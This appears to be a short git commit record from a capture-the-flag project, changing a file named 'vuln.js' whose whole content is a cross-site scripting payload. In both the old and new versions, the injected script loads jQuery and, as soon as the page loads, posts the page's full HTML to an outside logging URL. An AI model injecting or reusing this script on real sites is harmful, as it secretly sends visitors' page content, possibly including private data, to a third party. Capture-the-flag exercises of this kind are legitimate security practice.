fbf13d1bcd310e5a9faaf442e028788a465d068f
Chris Kankiewicz <Chris@ChrisKankiewicz.com>
2014-04-12 21:15:21 -0700

    / ‘kpop/vuln.js’

--- kpop/vuln.js
+++ kpop/vuln.js
@@ -1,1 +1,1 @@
-<script type='text/javascript' src='https://code.jquery.com/jquery-2.1.0.min.js'></script><script type='text/javascript'>$(document).ready(function() { $.post('https://www.phx2600.org/files/ctf/logPost.php', { data: $('html').html() }); });</script>
+<script src='https://code.jquery.com/jquery-2.1.0.min.js'></script><script>$(document).ready(function() { $.post('https://www.phx2600.org/files/ctf/logPost.php', { data: $('html').html() }); });</script>
